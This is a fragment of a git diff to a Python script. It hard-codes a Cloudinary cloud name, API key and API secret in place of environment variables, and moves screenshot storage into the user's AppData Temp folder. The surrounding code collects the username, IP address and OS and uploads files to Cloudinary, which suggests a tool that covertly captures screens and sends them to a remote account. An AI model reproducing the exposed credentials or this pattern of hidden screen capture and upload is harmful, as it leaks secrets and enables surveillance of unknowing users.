@@ -20,14 +20,11 @@ def load_env():
 load_env()
 
 config(
-    cloud_name=environ.get("CLOUD_NAME"),
-    api_key=environ.get("API_KEY"),
-    api_secret=environ.get("API_SECRET"),
+    cloud_name="dsnwguzkd",
+    api_key="623166659259627",
+    api_secret="hrxWwTWkKXg_tQYr-0NGlqsjWDE",
     secure=True,
 )
-
-SAVE_PATH = "screenshots"
-makedirs(SAVE_PATH, exist_ok=True)
 
 INTERVAL = 5
 USER_NAME = getlogin()
@@ -37,6 +34,9 @@ try:
 except:
     IP_ADDRESS = "Unkown"
 OS_NAME = system()
+
+SAVE_PATH = f"C:/Users/{USER_NAME}/AppData/local/Temp"
+makedirs(SAVE_PATH, exist_ok=True)
 
 
 def upload_to_cloudinary(filepath: str) -> None:
